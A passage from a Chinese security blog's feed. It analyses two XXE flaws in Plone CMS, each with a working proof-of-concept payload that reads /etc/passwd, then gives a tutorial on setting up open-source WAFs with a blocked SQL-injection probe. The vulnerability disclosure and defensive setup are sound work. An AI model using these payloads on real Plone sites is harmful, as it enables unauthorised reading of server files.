class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意<code>importDocument</code>方法，该方法在lxml.etree下调用该方法</p><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\exportimport\handler.py</code></p><pre class="line-numbers language-none"><code class="language-none">class RegistryImporter(object):    &quot;&quot;&quot;Helper classt to import a registry file    &quot;&quot;&quot;    LOGGER_ID &#x3D; &#39;plone.app.registry&#39;    def __init__(self, context, environ):        self.context &#x3D; context        self.environ &#x3D; environ        self.logger &#x3D; environ.getLogger(self.LOGGER_ID)    def importDocument(self, document):        tree &#x3D; etree.fromstring(document)        if self.environ.shouldPurge():            self.context.records.clear()        i18n_domain &#x3D; tree.attrib.get(ns(&#39;domain&#39;, I18N_NAMESPACE))        if i18n_domain:            parseinfo.i18n_domain &#x3D; i18n_domain        for node in tree:            if not isinstance(node.tag, str):                continue            condition &#x3D; node.attrib.get(&#39;condition&#39;, None)            if condition and not evaluateCondition(condition):                continue            if node.tag.lower() &#x3D;&#x3D; &#39;record&#39;:                self.importRecord(node)            elif node.tag.lower() &#x3D;&#x3D; &#39;records&#39;:                self.importRecords(node)        parseinfo.i18n_domain &#x3D; None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此方法是此XXE的原因。 在网站设置<code>Site Setup</code>下的<code>Configuration Registry</code>中导出合适的XML文件。 在这里，选择了<code>plone.thumb_scale_table.xml</code>前缀文件。</p><p>参数 POC：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39;?&gt;&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt; ]&gt;&lt;registry&gt;  &lt;records interface&#x3D;&quot;Products.CMFPlone.interfaces.controlpanel.ISiteSchema&quot; prefix&#x3D;&quot;plone&quot;&gt;    &lt;value key&#x3D;&quot;thumb_scale_table&quot;&gt;&amp;title;&lt;&#x2F;value&gt;  &lt;&#x2F;records&gt;&lt;&#x2F;registry&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行后，您可以在错误报告中看到已解析的XML实体。<img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109142113406.png" alt="image-20201109142113406"></p><h3 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE-2"></a>XXE-2</h3><p><code>plone.app.dexterity-2.6.5-py3.6.egg\plone\app\dexterity\browser\modeleditor.py</code></p><pre class="line-numbers language-none"><code class="language-none">class AjaxSaveHandler(BrowserView):    &quot;&quot;&quot;Handle AJAX save posts.    &quot;&quot;&quot;    def __call__(self):        &quot;&quot;&quot;Handle AJAX save post.        &quot;&quot;&quot;        if not authorized(self.context, self.request):            raise Unauthorized        source &#x3D; self.request.form.get(&#39;source&#39;)        if source:            # Is it valid XML?            try:                root &#x3D; etree.fromstring(source)            except etree.XMLSyntaxError as e:                return json.dumps(&#123;                    &#39;success&#39;: False,                    &#39;message&#39;: &#39;XMLSyntaxError: &#123;0&#125;&#39;.format(                        safe_unicode(e.args[0])                    )                &#125;)            # a little more sanity checking, look at first two element levels            if root.tag !&#x3D; NAMESPACE + &#39;model&#39;:                return json.dumps(&#123;                    &#39;success&#39;: False,                    &#39;message&#39;: _(u&quot;Error: root tag must be &#39;model&#39;&quot;)                &#125;)            for element in root.getchildren():                if element.tag !&#x3D; NAMESPACE + &#39;schema&#39;:                    return json.dumps(&#123;                        &#39;success&#39;: False,                        &#39;message&#39;: _(                            u&quot;Error: all model elements must be &#39;schema&#39;&quot;                        )                    &#125;)            # can supermodel parse it?            # This is mainly good for catching bad dotted names.            try:                plone.supermodel.loadString(source, policy&#x3D;u&#39;dexterity&#39;)            except SupermodelParseError as e:                message &#x3D; e.args[0].replace(&#39;\n  File &quot;&lt;unknown&gt;&quot;&#39;, &#39;&#39;)                return json.dumps(&#123;                    &#39;success&#39;: False,                    &#39;message&#39;: u&#39;SuperModelParseError: &#123;0&#125;&#39;.format(message)                &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码使用lxml库，但是直接解析xml中的外部参数。 结果，在功能 <code>Dexterity Content Types</code>下选择<code> custom content types</code>，然后单击进入。 <code>fields</code>标签下的<code>Edit XML Field Model</code>可以直接编写xml代码。</p><p>参数 POC：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt; ]&gt;&lt;model xmlns:i18n&#x3D;&quot;http:&#x2F;&#x2F;xml.zope.org&#x2F;namespaces&#x2F;i18n&quot; xmlns:marshal&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;marshal&quot; xmlns:form&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;form&quot; xmlns:security&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;security&quot; xmlns:users&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;users&quot; xmlns:lingua&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;lingua&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;namespaces.plone.org&#x2F;supermodel&#x2F;schema&quot;&gt; &amp;title;&lt;schema&#x2F;&gt;&lt;&#x2F;model&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因为程序代码中似乎存在问题，所以无法添加XML声明文件，但是打开的默认声明文件具有添加的声明文件。 需要删除。 保存参数，并在返回后单击此处查看它们。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201110100900815.png" alt="image-20201110100900815"></p><p>问题相对利用条件较高，需要管理员权限，其后官方推出了更新版本5.2.3：<a href="https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt">https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Plone&quot;&gt;&lt;a href=&quot;#Plone&quot; class=&quot;headerlink&quot; title=&quot;Plone&quot;&gt;&lt;/a&gt;Plone&lt;/h2&gt;&lt;p&gt;Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>开源WAF搭建</title>
    <link href="https://misakikata.github.io/2020/09/%E5%BC%80%E6%BA%90WAF%E6%90%AD%E5%BB%BA/"/>
    <id>https://misakikata.github.io/2020/09/开源WAF搭建/</id>
    <published>2020-09-17T07:42:09.000Z</published>
    <updated>2020-09-17T07:42:29.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ModSecurity"><a href="#ModSecurity" class="headerlink" title="ModSecurity"></a>ModSecurity</h3><p>在Ubuntu和Nginx上安装，nginx版本为1.14.0。</p><h4 id="安装需要包"><a href="#安装需要包" class="headerlink" title="安装需要包"></a>安装需要包</h4><pre class="line-numbers language-none"><code class="language-none">apt-get install -y apt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="下载编译ModSecurity-3-0源代码"><a href="#下载编译ModSecurity-3-0源代码" class="headerlink" title="下载编译ModSecurity 3.0源代码"></a>下载编译ModSecurity 3.0源代码</h4><pre class="line-numbers language-none"><code class="language-none">git clone --depth 1 -b v3&#x2F;master --single-branch https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入目录运行编译</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;build.shgit submodule initgit submodule update.&#x2F;configuremakemake install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果出现<code>fatal: No names found, cannot describe anything.</code>，是可以忽略的。</p><h4 id="ModSecurity连接器"><a href="#ModSecurity连接器" class="headerlink" title="ModSecurity连接器"></a>ModSecurity连接器</h4><p>下载连接器代码</p><pre class="line-numbers language-none"><code class="language-none">git clone --depth 1 https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity-nginx.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据已安装的nginx版本安装需要的nginx原代码</p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.14.0.tar.gztar zxvf nginx-1.14.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>需要把连接器编译为动态模块到nginx中，到nginx目录下，其中的编译命令根据<code>nginx -V</code>来决定。</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;configure --with-compat --add-dynamic-module&#x3D;..&#x2F;ModSecurity-nginxmake modulesmkdir &#x2F;etc&#x2F;nginx&#x2F;modulescp objs&#x2F;ngx_http_modsecurity_module.so &#x2F;etc&#x2F;nginx&#x2F;modules&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>PS：运行<code>nginx -t</code>测试nginx运行，如果出现报错ModSecurity二进制文件不匹配，则可能是nginx版本验证不匹配，那就需要源码编译安装nginx，同时把ModSecurity一起编译。</p><h4 id="加载nginx动态模块"><a href="#加载nginx动态模块" class="headerlink" title="加载nginx动态模块"></a>加载nginx动态模块</h4><p>编译完成后的动态模块需要到配置文件中启动加载，修改配置文件<code>/etc/nginx/nginx.conf</code>中</p><pre class="line-numbers language-none"><code class="language-none">load_module &#x2F;etc&#x2F;nginx&#x2F;modules&#x2F;ngx_http_modsecurity_module.so;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="启用和测试规则"><a href="#启用和测试规则" class="headerlink" title="启用和测试规则"></a>启用和测试规则</h4><p>安装Spiderlabs的规则</p><pre class="line-numbers language-none"><code class="language-none">mkdir &#x2F;etc&#x2F;nginx&#x2F;modsecwget -P &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F; https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;SpiderLabs&#x2F;ModSecurity&#x2F;v3&#x2F;master&#x2F;modsecurity.conf-recommendedmv &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf-recommended &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>把ModSecurity中的unicode.mapping文件复制到以上目录</p><pre class="line-numbers language-none"><code class="language-none">cp ModSecurity&#x2F;unicode.mapping &#x2F;etc&#x2F;nginx&#x2F;modsec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改配置文件，其中配置部分被注释，需要安需要启用。</p><pre class="line-numbers language-none"><code class="language-none">SecRuleEngine DetectionOnly  #仅检测恶意流量，改为on为丢弃恶意流量<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加owasp的规则，在nginx下创建目录</p><pre class="line-numbers language-none"><code class="language-none">mkdir owasp-modsecurity-crscd owasp-modsecurity-crswget https:&#x2F;&#x2F;github.com&#x2F;coreruleset&#x2F;coreruleset&#x2F;archive&#x2F;v3.3.0.tar.gzmv crs-setup.conf.example crs-setup.confmv rules&#x2F;REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example rules&#x2F;REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.confmv rules&#x2F;RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example rules&#x2F;RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在modsec中修改modsecurity.conf，添加配置文件，同时把rules目录下的配置文件添加进去</p><pre class="line-numbers language-none"><code class="language-none">Include &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;owasp-modsecurity-crs&#x2F;coreruleset-3.3.0&#x2F;crs-setup.confInclude &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;owasp-modsecurity-crs&#x2F;coreruleset-3.3.0&#x2F;rules&#x2F;*.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在nginx配置文件中添加此配置</p><pre class="line-numbers language-none"><code class="language-none">vi sites-enabled&#x2F;defaultserver &#123;    listen 80;    modsecurity on;    modsecurity_rules_file &#x2F;etc&#x2F;nginx&#x2F;modsec&#x2F;modsecurity.conf;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以到crs配置文件中找到对应的规则来启用，比如如下启用id为900240的后缀文件检测</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\user&gt;curl http:&#x2F;&#x2F;192.168.120.142&#x2F;admin.db&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.14.0&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下会拦截常见的web攻击，比如</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\user&gt;curl http:&#x2F;&#x2F;192.168.120.142&#x2F;admin.php?id&#x3D;1%20and%201&#x3D;1&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.14.0&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="配置新的conf文件"><a href="#配置新的conf文件" class="headerlink" title="配置新的conf文件"></a>配置新的conf文件</h4><p>如果默认的规则文件不符合需求，获取由于其他原因需要添加规则。先看一个普通的规则是怎么样的</p><pre class="line-numbers language-none"><code class="language-none">SecRule REQUEST_FILENAME &quot;@endsWith &#x2F;wp-login.php&quot; \    &quot;id:1003,\    phase:2,\    pass,\    nolog,\    ctl:ruleRemoveTargetByTag&#x3D;OWASP_CRS;ARGS:pwd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相当于在wp-login.php页面中，禁用对参数pwd的拦截检查。其中的格式是</p><pre class="line-numbers language-none"><code class="language-none">SecRule VARIABLES OPERATOR ACTIONSVARIABLES ：代表HTTP包中的标识项，规定了安全规则针对的对象。OPERATOR：代表操作符，一般用来定义安全规则的匹配条件。ACTIONS：代表响应动作，一般用来定义数据包被规则命中后的响应动作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>比如，我们打算写一个只允许特定IP访问的路径。这时候需要两条规则来判断，需要<code>chain</code>来连接动作。把它保存到上面crs配置文件路径。重启nginx</p><pre class="line-numbers language-none"><code class="language-none">SecRule REQUEST_FILENAME &quot;@endsWith &#x2F;login.php&quot; \&quot;id:91002,\phase:1,\pass,\nolog,\deny,\chain&quot;SecRule  REMOTE_ADDR &quot;!@ipMatch 192.168.120.1&quot; \&quot;t:none&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置文档参考：<code>http://www.modsecurity.cn/chm/ConfigurationDirectives.html</code></p><h3 id="VeryNginx"><a href="#VeryNginx" class="headerlink" title="VeryNginx"></a>VeryNginx</h3><p>VeryNginx 基于 <code>lua_nginx_module(openrestry)</code> 开发。 集成在 Nginx 中运行，扩展了 Nginx 本身的功能，并提供了友好的 Web 交互界面。本质上这并不是一个WAF，只是openrestry的界面化。但是可以通过界面化的配置规则来实现waf的功能。</p><p><code>https://github.com/alexazhou/VeryNginx</code></p><h4 id="一键配置"><a href="#一键配置" class="headerlink" title="一键配置"></a>一键配置</h4><p>克隆 VeryNginx 仓库到本地, 然后进入仓库目录，执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">python install.py install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可一键安装 VeryNginx 和 以及依赖的 OpenResty，可以先修改其中的版本为新版本地址再安装。</p><h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h4><p>手动安装，需要本地的nginx有openrestry，所以先安装。</p><pre class="line-numbers language-none"><code class="language-none">apt-get install libreadline-dev libpcre3-dev libssl-dev perlwget https:&#x2F;&#x2F;openresty.org&#x2F;download&#x2F;openresty-1.17.8.2.tar.gz.&#x2F;configure -j2make -j2sudo make installexport PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;openresty&#x2F;bin:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候会把openrestry加入快捷命令，如果直接执行openrestry将开启自带的nginx。</p><p>再来安装verynginx</p><pre class="line-numbers language-none"><code class="language-none">python install.py install verynginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在nginx的配置文件中添加以下规则，需要配置到不同的地方。</p><pre class="line-numbers language-none"><code class="language-none">include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_external.conf;   #http外部include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_http_block.conf;  #http内部include &#x2F;opt&#x2F;verynginx&#x2F;verynginx&#x2F;nginx_conf&#x2F;in_server_block.conf;  #server内部<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在地址<code>/verynginx/index_zh.html</code>下即可访问到页面。</p><p>默认的账号密码都是<code>verynginx</code> / <code>verynginx</code>。添加规则的方式比modsecurity简单，但自带的规则过于简单，需要自己添加规则。</p><p>已有的规则可以参考：<code>https://github.com/unixhot/waf</code></p><h3 id="JxWaf"><a href="#JxWaf" class="headerlink" title="JxWaf"></a>JxWaf</h3><p><code>https://github.com/jx-sec/jxwaf</code></p><p>jxwaf(锦衣盾)是一款开源WEB应用防火墙，分为客户端和服务端，客户端也是openrestry开发而来。</p><h4 id="服务端安装"><a href="#服务端安装" class="headerlink" title="服务端安装"></a>服务端安装</h4><p>采用私有化部署</p><pre class="line-numbers language-none"><code class="language-none">docker run -d -p 80:80 jxwaf&#x2F;jxwaf-server:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拉取后，访问地址邮箱验证码随便填写，注册账号在全局配置页面获取”api key”和”api password”</p><h4 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h4><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jx-sec&#x2F;jxwaf.gitcd jxwafsh install_waf.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在下载的文件内：</p><pre class="line-numbers language-none"><code class="language-none">cd toolspython jxwaf_init.py --api_key&#x3D;xxxx --api_password&#x3D;xxxx --waf_server&#x3D;http:&#x2F;&#x2F;192.168.1.1&#x2F;opt&#x2F;jxwaf&#x2F;nginx&#x2F;sbin&#x2F;nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在网站管理中添加对应的域名和IP端口</p><h3 id="Janusec"><a href="#Janusec" class="headerlink" title="Janusec"></a>Janusec</h3><p>可多节点布置的应用网关。<code>https://github.com/Janusec/janusec</code></p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;www.janusec.com&#x2F;download&#x2F;janusec-latest.tar.gztar zxf .&#x2F;janusec-latest.tar.gzcd janusec-0.9.9.&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此处选择的是1，主节点。默认安装的路径为 <code>/usr/local/janusec/</code></p><p>由于需要postgresql</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install postgresql postgresql-clientsudo -i -u postgrescreate user janusec with password &#39;janusec&#39;;create database janusec owner janusec;grant all on database janusec to janusec;\q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编辑 <code>/usr/local/janusec/config.json</code> ，尝试开启waf</p><pre class="line-numbers language-none"><code class="language-none">systemctl start janusec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置中管理太台监听设置为true，则使用http:9080端口，此处修改为false，直接在目录<code>janusec-admin/</code></p><p>默认用户名：<code>admin</code>，默认口令：<code>J@nusec123</code>。在应用管理中添加IP端口信息即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ModSecurity&quot;&gt;&lt;a href=&quot;#ModSecurity&quot; class=&quot;headerlink&quot; title=&quot;ModSecurity&quot;&gt;&lt;/a&gt;ModSecurity&lt;/h3&gt;&lt;p&gt;在Ubuntu和Nginx上安装，nginx版本为1.14.0。&lt;/
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="https://misakikata.github.io/tags/Open-Source-Security/"/>
    
  </entry>
  
</feed>
